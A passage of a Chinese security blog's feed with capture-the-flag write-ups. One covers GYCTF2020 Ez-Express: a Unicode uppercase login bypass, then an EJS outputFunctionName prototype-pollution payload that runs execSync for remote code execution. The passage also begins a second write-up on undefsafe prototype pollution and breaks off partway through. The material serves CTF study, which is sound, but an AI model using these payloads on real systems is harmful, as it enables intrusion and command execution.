    <content type="html"><![CDATA[<p>打开网站发现就这么一个页面</p><span id="more"></span><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003333304.png" alt="image-20250719003333304"></p><p>f12 也没能找到什么有用的东西</p><p>提示说用admin登录</p><p>尝试</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003436443.png" alt="image-20250719003436443"></p><p>被拒绝</p><p>我们在尝试注册</p><p>admin不能注册，随便换了个注册进入页面</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003535164.png" alt="image-20250719003535164"></p><p>在f12看一下</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003623393.png" alt="image-20250719003623393"></p><p>发现藏了一个压缩包</p><p>访问一下</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003702693.png" alt="image-20250719003702693"></p><p>拿到源码解压</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719003822768.png" alt="image-20250719003822768"></p><p>这里发现有lodash 和ejs 引擎 ，看lodash这个版本 有原型链污染漏洞，ejs引擎也可以进行rce</p><p>主要源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  if(!req.session.user)&#123;</span><br><span class="line">    res.redirect(&#x27;/login&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=undefined;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;login&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一眼就看到了merge</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clone 方法调用了merge 我们往下看看有什么调用了clone</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719004128236.png" alt="image-20250719004128236"></p><p>只有这一个地方</p><p>所以我们污染的地方大概率就是这里了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>他要先判断</p><p>session的user是否是”ADMIN”，但是这里我们是不知道ADMIN的密码的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>从他的登录函数里面发现</p><p><code>&#39;user&#39;:req.body.userid.toUpperCase(),</code> 这里他调用了转大写，那么我们就可以用特殊字符转为大写是ADMIN其中一个字符是否就可以绕过了呢？</p><p>问问大模型写了个脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import unicodedata</span><br><span class="line"></span><br><span class="line">def is_uppercase_letter(s):</span><br><span class="line">    return len(s) == 1 and &#x27;A&#x27; &lt;= s &lt;= &#x27;Z&#x27;</span><br><span class="line"></span><br><span class="line">def find_special_chars_to_uppercase_letters():</span><br><span class="line">    results = []</span><br><span class="line"></span><br><span class="line">    for codepoint in range(0x110000):  # Unicode 全范围</span><br><span class="line">        char = chr(codepoint)</span><br><span class="line">        upper_char = char.upper()</span><br><span class="line"></span><br><span class="line">        if is_uppercase_letter(upper_char) and not (&#x27;A&#x27; &lt;= char &lt;= &#x27;Z&#x27; or &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;):</span><br><span class="line">            try:</span><br><span class="line">                name = unicodedata.name(char)</span><br><span class="line">            except ValueError:</span><br><span class="line">                name = &quot;UNKNOWN&quot;</span><br><span class="line">            results.append((char, upper_char, f&quot;U+&#123;codepoint:04X&#125;&quot;, name))</span><br><span class="line"></span><br><span class="line">    return results</span><br><span class="line"></span><br><span class="line"># 执行并输出结果</span><br><span class="line">results = find_special_chars_to_uppercase_letters()</span><br><span class="line">for original, uppered, code, name in results:</span><br><span class="line">    print(f&quot;&#123;code&#125; &#x27;&#123;original&#125;&#x27; -&gt; &#x27;&#123;uppered&#125;&#x27; (&#123;name&#125;)&quot;)</span><br><span class="line"></span><br><span class="line">print(f&quot;\n总共有 &#123;len(results)&#125; 个字符在 upper() 后变成 A-Z&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后输出</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719004826401.png" alt="image-20250719004826401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">U+0131 &#x27;ı&#x27; -&gt; &#x27;I&#x27; (LATIN SMALL LETTER DOTLESS I)</span><br><span class="line">U+017F &#x27;ſ&#x27; -&gt; &#x27;S&#x27; (LATIN SMALL LETTER LONG S)</span><br></pre></td></tr></table></figure><p>所以我们成功找到了<code>ı</code>这个可以转为大写的I，试试能不能绕过</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719004941959.png" alt="image-20250719004941959"></p><p>成功进入了ADMIN 页面</p><p>接下来，我们继续分析，如何进行污染，执行rce</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719005229674.png" alt="image-20250719005229674"></p><p>这里题目给了提示 <code>outputFunctionName</code> 未定义 而且ejs 引擎的函数执行也会 调用 <code>outputFunctionName</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure><p>这里的写法基本是固定的，因为ejs底层的执行命令就可以这么写</p><p>接下来抓包 发送payload</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719010059267.png" alt="image-20250719010059267"></p><p>这里我们需要将这两个地方改为json格式</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;aaaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>发送，然后访问&#x2F;info调用执行</p><p><img src="/2025/07/19/GYCTF2020-Ez-Express/image-20250719010547148.png" alt="image-20250719010547148"></p><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;打开网站发现就这么一个页面&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="原型链污染" scheme="https://heisha123.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 青龙组]notes</title>
    <link href="https://heisha123.github.io/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/"/>
    <id>https://heisha123.github.io/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/</id>
    <published>2025-07-18T09:41:28.000Z</published>
    <updated>2025-07-18T10:09:00.736Z</updated>
    
    <content type="html"><![CDATA[<p>题目给了源码</p><p>因为靶场我们不好反弹shell</p><span id="more"></span><p>所以我们部署到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;</span><br><span class="line">        this.num = 0;</span><br><span class="line">        this.note_list = &#123;&#125;;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);   </span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let raw = req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/edit_note&#x27;)    </span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/status&#x27;)    </span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);   </span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;Sorry cant find that!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);</span><br><span class="line">  res.status(500).send(&#x27;Something broke!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))</span><br></pre></td></tr></table></figure><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p>首先我们打开ubantu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/wdb2020</span><br><span class="line">vim app.js</span><br><span class="line">//复制源码粘贴进去</span><br><span class="line">npm install undefsafe@2.0.2 --save  //因为我们这里漏洞生效的版本在 &lt;=2.0.3</span><br><span class="line">npm install express pug</span><br><span class="line"></span><br><span class="line">mkdir /root/wdb2020/views</span><br><span class="line">touch index.pug  mess.pug  note.pug  //可以为空保证我们的js文件能正常运行即可</span><br><span class="line"></span><br><span class="line">//最后运行app.js</span><br><span class="line"></span><br><span class="line">node app.js</span><br></pre></td></tr></table></figure><h3 id="代码分析及解决"><a href="#代码分析及解决" class="headerlink" title="代码分析及解决"></a>代码分析及解决</h3><p>我们注意到其使用了 undefsafe 模块，那么如果我们可以操纵其第 2、3 个参数，即可进行原型链污染，则可使目标网站存在风险。故此，我们首先要寻找 undefsafe 的调用点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get_note(id) &#123;</span><br><span class="line">    var r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">    return r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(this.note_list, id + &#x27;.author&#x27;, author); </span><br><span class="line">    undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现在查看 note 和编辑 note 时会调用 undefsafe，那我们首先查看 get_note 方法会被哪个路由调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) 